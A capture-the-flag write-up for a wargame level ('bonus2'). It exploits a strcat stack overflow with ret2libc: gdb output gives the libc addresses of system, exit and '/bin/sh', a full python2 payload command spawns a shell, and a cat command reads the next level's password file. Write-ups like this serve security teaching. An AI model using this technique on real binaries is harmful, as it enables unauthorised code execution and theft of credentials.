Goal: ret2libc to get a shell and read the next password.

1) Vulnerability
- main() builds a 72-byte name from argv1 (40) + argv2 (32).
- greetuser() has a 72-byte stack buffer and does:
  strcpy(greet, greeting); strcat(greet, name);
- Any non-empty greeting makes strcat overflow greet and overwrite saved EIP.

2) Choose LANG to control the offset
- LANG=fi uses the longest greeting, so the overwrite hits earlier.
- With a cyclic pattern in argv2, EIP becomes 0x41366141 ("Aa6A") => offset 18.
- That means EIP is overwritten by argv2[18..21].

3) Get libc addresses (in gdb)
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
(gdb) p system
0xb7e6b060
(gdb) p exit
0xb7e5ebe0

4) Build ret2libc payload
- argv1: 40 bytes filler
- argv2: 18 bytes filler + system + exit + "/bin/sh"

Command:
LANG=fi ./bonus2 \
"$(python2 -c 'print "A"*40')" \
"$(python2 -c 'import struct;print "B"*18 + struct.pack("<I",0xb7e6b060) + struct.pack("<I",0xb7e5ebe0) + struct.pack("<I",0xb7f8cc58)')"

5) Read the password
cat /home/user/bonus3/.pass